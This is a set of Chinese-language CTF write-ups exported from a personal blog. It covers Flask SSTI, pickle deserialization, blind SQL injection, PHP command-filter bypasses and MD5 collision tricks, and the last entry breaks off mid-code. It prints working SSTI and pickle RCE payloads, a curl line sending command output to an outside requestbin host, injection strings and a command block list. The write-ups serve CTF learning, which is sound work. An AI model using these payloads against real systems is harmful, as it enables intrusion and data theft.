    <url>/%5Bpasecactf_2019%5Dflask_ssti.html</url>
    <content><![CDATA[<h1 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h1><p>题目本身出的很诡异，flag删了然后源码里面放了一个憨批对称加密函数，加密过的flag放进了config里面，config可以直接看（BUU题目描述上的那个加密函数是错的），过滤了单引号点号下划线<br>目标是读源码</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>只过滤了单引号，双引号还能用，python单双引号好像没有什么大的区别，留了一个能用的就行<br>单双引号全挂了还过滤字符的话就只能用上次DASCTF的凑<code>%c</code>和全数字，然后一个个格式化字符串凑字母表<br>这里不用太麻烦，直接在双引号里面用十六进制<code>\\x00</code>就能绕过下划线的过滤，点号的过滤用方括号代替，一样能访问属性。<br>然后随便找个常用payload读文件就能打通。这次的记录主要是重新学习总结了一下SSTI相关的东西，找个机会开一篇文章</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="init-globals"><a href="#init-globals" class="headerlink" title="__init__.__globals__"></a>__init__.__globals__</h3><p>过去SSTI的时候大家很喜欢一个叫做<code>catch_warnings</code>的类，就是因为这个类可以使用<code>__init__.__globals__.__builtins__</code>然后随意发挥<br><code>__globals__</code>是全局对象，存了很多乱七八糟的对象，其中就有强有力的内置对象<code>__builtins__</code>（python2里是<code>__builtin__</code>）进而拿到eval这类的对象import os再popen一键打通<br>比如这个payload <code>&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;)</code><br>或者<code>{{url_for.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()'')}}</code><br>都是通过获取到<code>__globals__</code>后拿到<code>__builtins__</code>，用里面的各种各样的内置方法花式执行</p>
<p>那么为什么大家对<code>catch_warnings</code>情有独钟？问题就出在<code>__globals__</code>的获取上，对于一个函数对象，其直接拥有一个<code>__globals__</code>属性，而类不管是定义还是实例化的对象都不行，由此我们引出<code>__init__</code></p>
<p><code>__init__()</code>是一个类的构造函数，因此访问类的<code>__init__</code>属性我们将会直接获得一个函数，如果不存在构造函数就会返回一个wrapper包装器。<br>使用如下测试代码</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span>

<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> <span class="token number">1</span>

<span class="token keyword">def</span> <span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token number">1</span>

a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
c <span class="token operator">=</span> C<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>__init__<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># &lt;bound method A.__init__ of &lt;__main__.A object at 0x0000027C2C5C44F0>></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>A<span class="token punctuation">.</span>__init__<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># &lt;function A.__init__ at 0x0000027C2C70FEE0></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># &lt;function b at 0x0000027C2C70FE50></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>__globals__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取到了globals</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>__init__<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># &lt;method-wrapper '__init__' of C object at 0x0000027C2C6B8730></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>C<span class="token punctuation">.</span>__init__<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># &lt;slot wrapper '__init__' of 'object' objects></span>
</code></pre>
<p>可以看到，对拥有构造函数的A类，其类和实例化对象的<code>__init__</code>属性均存在，分别为function和bound method，且都能通过该属性访问到<code>__globals__</code>，而对于不存在构造函数的C类，其<code>__init__</code>变为了两个wrapper，也无法通过这个属性访问到<code>__globals__</code><br>所以<code>catch_warnings</code>这么受欢迎大概是其自带了构造函数吧</p>
<p>但是事实上flask有很多内置类也自带构造函数，并且能直接拿来用，而不是<code>&#39;&#39;.__class__.xxxxxx</code>这么一长串去找<br>比如</p>
<pre class=" language-python"><code class="language-python">url_for<span class="token punctuation">.</span>__init__
joiner<span class="token punctuation">.</span>__init__
config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__    <span class="token comment" spellcheck="true"># config是一个config类的实例对象，通过__class__获取到类定义本身再获取init，虽然直接从bound method也能访问到</span>
</code></pre>
<h3 id="属性访问和相关绕过"><a href="#属性访问和相关绕过" class="headerlink" title="属性访问和相关绕过"></a>属性访问和相关绕过</h3><p>方括号感觉功能性还强于点号。点号只能进行属性的访问，而方括号能访问数组下标和字典键值对，在渲染模板中同样提供了属性访问的功能。<br>并且方括号里面的属性都是字符串，能够提供各种各样的绕过方法，比如直接<code>\\x00</code>的十六进制，或者是之前”%c”%num这样子的格式化字符串，和方括号类似的还有attr()函数，不过这个函数只能访问属性，功能上和点号差不多，但是访问的属性同样以字符串参数的形式输入，可以进行超级绕过<br>attr()使用时需要以<code>c|attr(arg1)|attr(arg2)</code>方式使用，效果约等于<code>c.arg1.arg2</code>，用<code>|</code>还能进行各种各样的函数调用，join拼接字符串，urlencode编码，int和string进行类型转换，tolower等，没有参数的话括号可以不填<br><code>{%set x="%c"%(1|string,2|string,0|string)|join|int%}</code></p>
<p><code>joiner|attr(&quot;__init__&quot;)|attr(__globlas__)|attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)|attr(&quot;__getitem__&quot;)(&quot;__import__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(cmd)</code><br>注意attr和点号的功能一致，只支持属性访问，而<code>__globlas__</code>和<code>__builtins__</code>是字典类型的变量，所以要调用getitem方法进行数据的访问<br>函数调用的形式也很直接，<code>attr(&quot;__getitem__&quot;)</code>返回了一个函数对象，在函数对象后面直接加括号和参数进行调用，类似于PHP的动态执行？<br><code>attr(&quot;__getitem__&quot;)(&quot;__import__&quot;)(&quot;os&quot;)</code>这里先返回一个<code>__getitem__</code>函数，调用之后返回的<code>__import__</code>也是个函数，再调用，返回了<code>os</code>对象，最后<code>attr(&quot;popen&quot;)(cmd)</code>返回popen函数执行了命令<br>SSTI理解逐渐提升。。。</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>[watevrCTF2019]Pickle_Store</title>
    <url>/%5BwatevrCTF-2019%5DPickle%20Store.html</url>
    <content><![CDATA[<h1 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h1><p>之前做了他们的一个cookie store的题目，cookie伪造一下就能过，是个水题，就顺着做了他们的pickle store，做起来就不太对劲了，难度upup</p>
<p>同样在cookie处能取得一串base64，解码之后用pickle.loads加载，可以看到一个数组，记载了钱数和货物，但是这回多了一个hmac的签名，加密用的密钥是没办法搞出来了，那就只能另寻他路</p>
<h2 id="pickle反序列化漏洞"><a href="#pickle反序列化漏洞" class="headerlink" title="pickle反序列化漏洞"></a>pickle反序列化漏洞</h2><p>python的反序列化漏洞危害比PHP要大，因为能做到任意代码执行，直接写一个类，创建一个__reduce__方法，该方法在该类被序列化时使用，返回字符串或元组。<br>我们可以在返回值处调用我们想要使用的函数，不过这种方法只能调用一个函数，例如<code>return (os.system,(&#39;ls&#39;,))</code>，并且这里是一定要加逗号的，圆括号中添加逗号会将其声明为元组，而规定__reduce__方法的返回值必须是<strong>字符串或元组</strong>，使用不这么用就会报错</p>
<p>不过不必担心没有导入os模块，我们可以在__reduce__方法中使用import进行导入，__reduce__方法作为序列化的魔法方法，返回值可以被我们控制为函数，其被反序列化时可被执行，但这样子可以执行的函数只有返回值的那一个，想要执行多个代码，我们需要手搓pickle(但是没懂为什么可以在__reduce__中import模块来导入本来没有的模块)</p>
<h3 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h3><p>不同平台下的反序列化结果是不一样的，甚至python的版本也会影响pickle的结果，使用这个题在Windows下生成的payload就不奏效，最后又回到Linux上做payload</p>
<h3 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h3><p>这里无论执行什么都不会有回显，但是通过执行time.sleep发现有明显的延迟，证实可以命令执行，使用url进行外带或者反弹shell，反弹shell弹了几下没成功，curl外带可以去buu的这个平台<a href="http://http.requestbin.buuoj.cn/">http://http.requestbin.buuoj.cn/</a><br>执行的命令是 <code>curl http://http.requestbin.buuoj.cn/17ozn5q1/\?a=\</code>ls &#x2F; | base64 | sed -n “1p”`&#96;<br>一开始还没看懂，其实就是像这个平台发一个请求，用GET提交一个a，内容为反引号命令执行的内容</p>
<h3 id="手搓pickle的任意命令执行"><a href="#手搓pickle的任意命令执行" class="headerlink" title="手搓pickle的任意命令执行"></a>手搓pickle的任意命令执行</h3><p>使用一个名为marshal的库可以实现(不过如果这个库被ban了也就没戏了)<br>参考链接 <a href="https://www.freebuf.com/articles/system/89165.html">https://www.freebuf.com/articles/system/89165.html</a></p>
<p>比如p神说的这种情况，这时需要真正的手搓pickle，理解其基本意义，实现命令执行<br><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">p神的题和解法</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>反序列化</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>嘶吼CTF Online Proxy</title>
    <url>/%5B%E5%98%B6%E5%90%BCCTF%5D%20Online%20Proxy.html</url>
    <content><![CDATA[<h1 id="嘶吼CTF-Online-Proxy"><a href="#嘶吼CTF-Online-Proxy" class="headerlink" title="[嘶吼CTF] Online Proxy"></a>[嘶吼CTF] Online Proxy</h1><p>嘶吼的一个题，好像上次打了嘶吼，然后一个题磨了一天没摸出来</p>
<p>一开始以为是ssrf，试了半天发现写死了必须要http:&#x2F;&#x2F; 开头，感觉就没机会了，查看源码，发现一个注释显示显示了当前IP，修改XFF头发现可控，并且会保存上一次访问的IP，这里就会用到数据库，所以可能存在一个注入</p>
<p>测试，打一个0’ or sleep(5) or ‘0过去，无延迟，显示payload，然后再重新随便打一个xff过去，出现延迟，在输入相同的xff，返回了0，出现延迟证明存在注入，只是没懂后端的查询代码是怎么样的，给人的感觉就像是直接是一句select xff一样。union select打了一下没有反应，报错也不存在，返回值有0和1，那就只能盲注了</p>
<p>然后自己动手做盲注，踩了一个小坑，即or和||是一致的，而|代表按位或，一开始用0’ or length(payload) or ‘0这么打，连length的返回值都是1。因为这种用or and这些来进行判断的结果只能是true 1和false 0嘛，愚蠢了。<br>而与零按位或数字则保持不变，就能获取结果，但是0和字符串或就会把字符串强制类型转换成数字，所以还是只能盲注</p>
<p>然后盲注二分打本来就慢，提示flag不在当前库，需要额外查一下库名，查表名列名的操作也略有修改。然后好像脚本访问速度过快，库名打到个information_schema服务器直接connection abort了。。。。盲注失败，自闭了</p>
<p>查wp查到一个赵总的脚本，将取出来的字符串转化成十进制数输出，然后再转成十六进制换回ASCII码快速获取字段，效率高了很多，太强了</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title>[安洵杯 2019]easy_web</title>
    <url>/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_web.html</url>
    <content><![CDATA[<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>刷题记录</p>
<p>题目第一层那个文件名两次base64加密一次十六进制转ascii，真的有点毒，我用的在线解码还出问题了。。。过了就可以拿到index.php的源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;img src='data:image/gif;base64,"</span> <span class="token punctuation">.</span> <span class="token variable">$txt</span> <span class="token punctuation">.</span> <span class="token string">"'>&lt;/img>"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>说白了就是不让直接获取flag，强类型md5过了之后可以过一个超级过滤来执行命令</p>
<h2 id="强类型md5"><a href="#强类型md5" class="headerlink" title="强类型md5"></a>强类型md5</h2><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>限制了类型为string，且比较类型为强类型，需要硬碰撞出两个md5一样的字符串，抄一个现成的</p>
<blockquote>
<p>a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p>
</blockquote>
<p>b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
<h2 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h2><p>Linux下的命令执行有很多绕过方法，空格使用<code>$IFS$n</code>（n为任意数字）代替，过滤关键字可以用变量拼接绕过，例如<code>a=l;$&#123;a&#125;s;</code>即为<code>ls</code>，还可以在命令中穿插\，不会影响命令执行，如<code>c\at /fl\ag</code></p>
<h2 id="正则匹配与转义"><a href="#正则匹配与转义" class="headerlink" title="正则匹配与转义"></a>正则匹配与转义</h2><p>PHP在进行正则匹配时需要经过两层转义才能获取到真实的字符，第一层为PHP自身的转义，第二层为正则引擎的转义，因此\\\\四个反斜杠才能匹配到一个反斜杠\，而该题中\\|\\\\这一段经过两重转义之后变成了匹配<code>|\</code>，反而不能匹配单个的反斜杠了，所以光看还是不够，有的地方还是得自己本地跑一下才知道效果</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>[强网杯2020] web</title>
    <url>/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF2020%5Dweb.html</url>
    <content><![CDATA[<h1 id="强网杯2020-web"><a href="#强网杯2020-web" class="headerlink" title="[强网杯2020] web"></a>[强网杯2020] web</h1><p>太难了，除了强网先锋的题都做不出来，强网先锋部分简单题都不会</p>
<p>web分类的题一个也不会，菜逼的眼神</p>
<h2 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h2><p>命令注入，或者说直接就是命令执行吧，啥过滤都不给的，非常的主动啊</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"ip"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ping -c 3 $_GET[ip]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span> 
</code></pre>
<p>分号闭合语句，扫一下根目录没看见flag，用<code>127.0.0.1;find -name &#39;fla*&#39;</code>找到flag.php，<code>cat fla*</code>获取flag</p>
<h2 id="FunHash"><a href="#FunHash" class="headerlink" title="FunHash"></a>FunHash</h2><p>超级md5绕过</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">'conn.php'</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//level 1</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"hash1"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string">"md4"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"hash1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'level 1 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//level 2</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hash2'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hash3'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hash2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'hash3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'level 2 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//level 3</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM flag WHERE password = '"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"hash4"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p>level1是使用md4的弱类型比较，使用超级爆破，获取字符串0e251288019，md4计算后为0e874956163641961271069404332409，弱类型比较相等<br>level2是要求值强类型不等且md5值强类型相等，使用md5处理数组为false绕过<br>level3需要使用万能语句进行注入，这是一个收集的点，字符串ffifdyop的md5结果为<code>&#39;or&#39;6�]��!r,��b</code>查询全部结果，获取flag</p>
<h2 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h2><p>反序列化题<br>index.php接受两个参数序列化一个player对象</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span> <span class="token string">"common.php"</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$player</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">player</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"caches/"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$player</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token delimiter">?></span>
</code></pre>
<p>play.php反序列化</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span> <span class="token string">"common.php"</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>
